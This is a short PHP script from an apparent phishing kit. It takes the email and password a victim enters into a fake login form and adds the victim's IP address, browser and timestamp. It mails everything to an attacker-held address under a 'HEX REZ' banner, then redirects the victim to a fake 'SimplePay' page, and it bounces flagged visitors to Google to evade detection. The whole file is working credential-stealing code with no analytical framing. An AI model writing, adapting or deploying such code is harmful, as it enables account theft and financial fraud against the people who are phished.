<?php

session_start();
error_reporting(1);

	if(isset($_SESSION['access']) && $_SESSION['access'] == false){
		header("location:https://www.google.com");
	}

include('email.php');

$ip = $_SESSION['ip'] = getenv("REMOTE_ADDR");

$_SESSION['user'] = $_POST['em'];
$_SESSION['pass'] = $_POST['ed'];

$date = date("d M, Y");
$time = date("g:i a");
$date = trim($date.", Time : ".$time);

$message  = "#----------------+ [ HEX REZ ] +----------------#\n";
$message .= "#---------------++==[ LOGIN ]==++-------------#\n";
$message .= "Email 		: ".$_SESSION['user']."\n";
$message .= "Password	: ".$_SESSION['pass']."\n";
$message .= "#---------------++==============++-------------#\n";
$message .= "Client IP	: ".$_SESSION['ip']."\n";
$message .= "Agent		  : ".$_SERVER ['HTTP_USER_AGENT']."\n";
$message .= "Date		    : ".$date."\n";
$message .= "whatismyip	: http://ip-score.com/checkip/".$_SESSION['ip']."\n";
$message .= "#----------------+ [ HEX REZ ] +----------------#\n";
$subject  = "HEX LOGIN Fr0m [ $ip ]";
$headers  = "From:HEXO <resultats@tsbdumbs.com>\r\n";
mail($fiftyme,$subject,$message,$headers);

header("location:SimplePay.php");
?>
